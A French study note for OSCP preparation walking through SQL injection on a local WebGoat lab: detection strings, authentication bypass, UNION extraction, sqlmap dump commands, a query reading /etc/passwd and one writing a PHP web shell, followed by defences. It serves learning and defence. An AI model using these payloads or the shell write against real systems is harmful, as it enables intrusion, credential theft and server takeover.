---
date: 2026-02-17
type: ethical-hacking
tags: [security, hacking, sql-injection, owasp, web-security, learning, beginner]
status: active
certification: OSCP
phase: 2
---

# 🔐 ETHICAL HACKING — SQL Injection sur WebGoat

> **Contexte :** Educational — OWASP Top 10 Learning Path
> **Niveau :** [x] Beginner [ ] Intermediate [ ] Advanced
> **Phase learning :** Phase 2 — Core Security + OWASP Top 10

---

## 🎯 Objectif d'apprentissage

Comprendre et exploiter les vulnérabilités SQL Injection (OWASP A03:2021) dans un environnement contrôlé (WebGoat).
Objectif final : maîtriser détection, exploitation et défense avant de passer aux labs HackTheBox.

---

## 📚 Domaine technique

- [ ] Network Security
- [x] **Web Security** — OWASP Top 10, injection, XSS, CSRF ← **(focus session)**
- [ ] Cryptography
- [ ] System Hardening
- [ ] Reverse Engineering
- [ ] Reconnaissance
- [x] **Exploitation** — Vulnérabilités, payloads
- [ ] Post-Exploitation
- [ ] Forensics
- [x] **Defense/Blue Team** — Detection, response

---

## 🔍 Concept clé exploré

### Théorie
SQL Injection (SQLi) survient quand une application web intègre des **données utilisateur non filtrées** directement dans une requête SQL. L'attaquant peut alors manipuler la logique de la base de données pour:
- Bypasser l'authentification
- Extraire des données sensibles (credentials, PII)
- Modifier/supprimer des données
- Dans certains cas: exécuter des commandes système (xp_cmdshell)

### Vulnérabilité / Vecteur d'attaque
```
Type      : CWE-89 — Improper Neutralization of Special Elements in SQL Command
OWASP     : A03:2021 — Injection
Sévérité  : CRITIQUE (CVSS 9.8 pour SQLi aveugle sur auth)
Vecteur   : Input fields, URL params, HTTP headers, cookies
```

### Prérequis
- **Connaissance :** Bases SQL (SELECT, WHERE, UNION, commentaires)
- **Outils :** WebGoat (local), SQLmap, Burp Suite Community
- **Environnement :** WebGoat en local (Docker ou JAR) — Lab isolé

---

## 🛠️ Outils utilisés

| Outil | Commande clé | Documentation |
|-------|--------------|---------------|
| WebGoat | `java -jar webgoat-server.jar` | localhost:8080/WebGoat |
| SQLmap | `sqlmap -u "URL" --dbs` | sqlmap.org |
| Burp Suite | Proxy → Repeater → Intruder | portswigger.net |
| curl | `curl -X POST -d "param=payload"` | man curl |
| Browser DevTools | F12 → Network tab | Built-in |

---

## 📋 Walkthrough Complet (4 étapes)

### Étape 1 : Setup & Reconnaissance

**Setup WebGoat (Docker — recommandé) :**
```bash
# Pull et lancer WebGoat
docker pull webgoat/webgoat
docker run -p 8080:8080 -p 9090:9090 webgoat/webgoat

# Accès : http://localhost:8080/WebGoat
# Créer compte → Aller dans : SQL Injection → Introduction
```

**Reconnaissance du formulaire cible :**
```bash
# Identifier les champs vulnérables via DevTools
# F12 → Network → soumettre formulaire → voir requête POST

# Exemple: champ "username" dans login form
# URL cible: http://localhost:8080/WebGoat/SqlInjection/login
```

**Output :** Identifier tous les inputs → noter ceux non filtrés
**Analyse :** Tout champ texte = vecteur potentiel SQLi

---

### Étape 2 : Test & Détection SQLi

**Test basique — Détecter la vulnérabilité :**
```sql
-- Test 1: Simple quote (erreur SQL = vulnérable)
'

-- Test 2: Boolean (si résultats changent = vulnérable)
' OR '1'='1
' OR '1'='2

-- Test 3: Commentaire SQL
'--
'#
admin'--

-- Test 4: Time-based (si délai = vulnérable blind SQLi)
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

**Via Burp Suite — Intercepter la requête :**
```
1. Activer proxy Burp (127.0.0.1:8080)
2. Soumettre formulaire login
3. Intercepter requête POST
4. Envoyer vers Repeater (Ctrl+R)
5. Modifier paramètre username → tester payloads
6. Observer réponses (erreurs SQL, changement comportement)
```

**Output attendu si vulnérable :**
```
Error: You have an error in your SQL syntax near ''' at line 1
→ Confirmation: application vulnérable SQLi
```

---

### Étape 3 : Exploitation

**Bypass authentification :**
```sql
-- Username field: bypasse la vérification password
admin'--
admin' OR '1'='1'--
' OR 1=1--
" OR 1=1--
' OR 'x'='x

-- Requête originale (backend):
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'

-- Après injection (admin'--):
SELECT * FROM users WHERE username='admin'--' AND password='...'
-- Le -- commente le reste → authentifié comme admin sans password!
```

**UNION-based SQLi — Extraire données :**
```sql
-- D'abord: trouver nombre de colonnes
' ORDER BY 1--   → OK
' ORDER BY 2--   → OK
' ORDER BY 3--   → Erreur → 2 colonnes

-- Identifier colonnes affichées
' UNION SELECT NULL, NULL--
' UNION SELECT 'test1', 'test2'--

-- Extraire noms de tables
' UNION SELECT table_name, NULL FROM information_schema.tables--

-- Extraire colonnes d'une table
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--

-- Extraire credentials
' UNION SELECT username, password FROM users--
```

**SQLmap — Automatisation (après confirmation manuelle) :**
```bash
# Scanner une URL pour SQLi
sqlmap -u "http://localhost:8080/WebGoat/SqlInjection/attack5a?account=Smith" \
       --dbs \
       --batch

# Extraire tables d'une DB
sqlmap -u "URL" -D webgoat --tables --batch

# Extraire données d'une table
sqlmap -u "URL" -D webgoat -T user_data --dump --batch

# Via POST request (sauvegarder requête Burp → fichier .txt)
sqlmap -r request.txt --dbs --batch
```

**Output exploitation réussie :**
```
[INFO] retrieved: webgoat
[INFO] retrieved: user_data
Database: webgoat
Table: user_data
[6 entries]
+----+----------+----------+
| id | username | password |
+----+----------+----------+
| 1  | admin    | admin    |
| 2  | jsmith   | test     |
+----+----------+----------+
```

---

### Étape 4 : Post-Exploitation & Cleanup

**Évaluation de l'impact :**
```sql
-- Vérifier privilèges DB
' UNION SELECT user(), version()--

-- Lire fichiers système (MySQL - si FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL--

-- Écrire fichier (si INTO OUTFILE autorisé)
' UNION SELECT '<?php system($_GET["cmd"]); ?>', NULL
  INTO OUTFILE '/var/www/html/shell.php'--
```

**Dans contexte WebGoat (lab) → noter :**
- Données extraites ✅
- Niveau d'accès obtenu ✅
- Techniques qui ont fonctionné ✅
- Documenter dans cette note ✅

---

## 🧠 Insights & Lessons Learned

### Qu'est-ce que j'ai appris ?
1. **SQLi = problème de confiance** : Toute donnée utilisateur non validée est dangereuse
2. **Ordre d'attaque** : Détection → Fingerprint DB → Enumération → Extraction → Escalade
3. **SQLmap vs Manuel** : Manuel d'abord pour comprendre, SQLmap pour automatiser en pentest réel
4. **UNION vs Blind** : UNION si données affichées, Blind (boolean/time) si pas d'affichage direct

### Piège courant
> **Ne pas confondre** encodage URL dans les payloads : `'` = `%27` dans URL params.
> Toujours tester via Burp Repeater plutôt que directement dans browser (URL encoding auto).

### Défense correspondante
```
✅ Prepared Statements (Parameterized Queries) — Solution #1
   → Java: PreparedStatement pstmt = conn.prepareStatement("SELECT * FROM users WHERE username=?");
   → Python: cursor.execute("SELECT * FROM users WHERE username=%s", (username,))

✅ Input Validation + Whitelisting
   → Accepter seulement alphanumérique pour username
   → Rejeter caractères spéciaux: ' " ; -- /* */

✅ ORM frameworks
   → Django ORM, SQLAlchemy, Hibernate = protection automatique si bien utilisés

✅ WAF (Web Application Firewall)
   → ModSecurity, Cloudflare WAF = couche défense supplémentaire

✅ Principe du moindre privilège DB
   → Compte DB app = SELECT only (jamais sa, root, admin)

✅ Error handling
   → Jamais afficher erreurs SQL à l'utilisateur
   → Logs internes seulement
```

---

## 📊 CTF / Challenge Info

- **Platform :** WebGoat (OWASP — local lab)
- **Challenge :** SQL Injection — Lessons 2, 5, 9, 10
- **Difficulty :** Beginner → Intermediate
- **Points :** N/A (training)
- **Status :** [ ] Solved [x] In Progress

### Progression WebGoat SQL Injection
- [x] Lesson 2: What is SQL?
- [x] Lesson 3: Data Manipulation Language (DML)
- [ ] Lesson 5: String SQL injection ← **En cours**
- [ ] Lesson 9: Numeric SQL injection
- [ ] Lesson 10: Query chain injection
- [ ] Lesson 11: Compromising Confidentiality with String Injection
- [ ] Lesson 12: Compromising Integrity with Query Chaining
- [ ] Lesson 13: Compromising Availability

---

## 🔗 Ressources & Références

- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [OWASP SQLi Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLmap Documentation](https://sqlmap.org/)
- [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [[HACKERGPT/SQL_INJECTION_EXPLOITATION]]
- [[HACKERGPT/HEXSTRIKE/Outils/SQLmap]]
- [[HACKERGPT/RESSOURCES_LEARNING]]

---

## 📖 Certification / Progress

- **Certification visée :** OSCP (Offensive Security Certified Professional)
- **Progrès phase 2 :** 15% (OWASP Top 10 — SQLi en cours)
- **Prochaine étape :** Compléter WebGoat SQLi → Passer XSS (Lesson suivante)
- **Lien phase suivante :** Phase 2 → XSS → CSRF → File Upload → Command Injection

---

## ⚠️ Legal & Ethical Notice

✅ **Contexte autorisé :**
- [x] CTF/Competition
- [x] Educational environment (WebGoat = lab isolé)
- [ ] Authorized pentesting
- [x] Lab/Sandbox only

🚫 **Non applicable à :** Tout système en production sans autorisation écrite explicite.
📋 **Règle d'or :** Si tu n'as pas de permission écrite → tu ne testes pas.

---

*Dernière mise à jour : 2026-02-17 | Phase : 2/4 Learning Path | Status: In Progress 🟡*